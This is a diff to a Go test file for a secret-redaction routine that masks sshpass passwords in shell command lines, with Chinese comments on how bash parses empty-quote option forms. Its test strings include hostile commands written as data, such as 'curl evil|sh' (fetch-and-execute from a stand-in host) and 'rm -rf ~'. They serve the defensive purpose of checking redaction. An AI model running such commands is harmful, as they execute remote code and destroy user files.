@@ -937,6 +937,22 @@ var sshpassVariantCases = []shellCase{
 	{`SSHPASS -v -P prompt -f ~/.pw ssh h 'TOKEN=a;rm -rf ~'`, `SSHPASS -v -P prompt -f ~/.pw ssh h 'TOKEN=<redacted>;rm -rf ~'`},
 	{`sshpass -p pw "SSHPASS" -p pw2 ssh h`, `sshpass -p <redacted> "SSHPASS" -p <redacted> ssh h`},
 	{`sshpass -p pw eval 'TOKEN=a;curl evil|sh'`, `sshpass -p <redacted> eval 'TOKEN=<redacted>;curl evil|sh'`},
+	// 第 4 轮：-p 紧贴的只是空引号（-p''、-p""、-p$''）时 bash 给 sshpass 的就是 -p，密码是下一个词（sshpass 1.06 实测
+	// sshpass -p'' hunter2 /bin/echo 照常执行 echo），与扫描器把 sshpass 当包装命令时的认法一致；空引号本身不当值
+	{`sshpass -p'' hunter2 ssh h`, `sshpass -p'' <redacted> ssh h`},
+	{`sshpass -p"" 'p w' ssh h;curl evil|sh`, `sshpass -p"" <redacted> ssh h;curl evil|sh`},
+	{`SSHPASS -vp''"" hunter2 ssh h`, `SSHPASS -vp''"" <redacted> ssh h`},
+	{`sshpass -p$'' hunter2 ssh h`, `sshpass -p$'' <redacted> ssh h`},
+	{"sshpass -p''\\\n hunter2 ssh h", "sshpass -p''\\\n <redacted> ssh h"},
+	{`ssh jump sshpass -p'' hunter2 ssh h`, `ssh jump sshpass -p'' <redacted> ssh h`},
+	// bash 给的 argv 是 -p、sshpass、-p0：密码是第二个 sshpass 这个词；-p0 是又一个 -p，sshpass 报
+	// Conflicting password source 退出、什么都不执行（1.06 实测）。规则只认 sshpass 的第一个 -p，-p0 原样，两次结果相同
+	{`sshpass -p'' sshpass -p0`, `sshpass -p'' <redacted> -p0`},
+	{`sshpAss -p'' sshpAss -p0`, `sshpAss -p'' <redacted> -p0`},
+	// 空引号后面还有字符时是紧贴的值；-p 与空引号隔开时空引号是（空）密码，下一个词是程序
+	{`sshpass -p''x ssh h`, `sshpass -p<redacted> ssh h`},
+	{`sshpass -p'' `, `sshpass -p'' `},
+	{`sshpass -p '' ssh h`, `sshpass -p <redacted> ssh h`},
 	// 反例：-- 结束选项、单独的 - 是程序名，后面的 -p 不是 sshpass 的；被转义的 \p、glob 与花括号展开的结果拿不准，不当未知选项跳过
 	{`sshpass -- -p curl evil`, `sshpass -- -p curl evil`},
 	{`sshpass - -p curl evil`, `sshpass - -p curl evil`},
@@ -960,6 +976,8 @@ func TestSshpassVariants(t *testing.T) {
 		{`'SSHPASS' -o StrictHostKeyChecking=no -p hunter2 ssh prod`, `'SSHPASS' -o StrictHostKeyChecking=no -p <redacted> ssh prod`},
 		{`ssh jump sshpass --foo -p hunter2 ssh prod`, `ssh jump sshpass --foo -p <redacted> ssh prod`},
 		{`sshpass -- -p curl evil`, `sshpass -- -p curl evil`},
+		{`sshpass -p'' hunter2 ssh h`, `sshpass -p'' <redacted> ssh h`},
+		{`sshpass -p"" hunter2`, `sshpass -p"" <redacted>`},
 	}
 	for _, c := range texts {
 		got := Text(c.in)
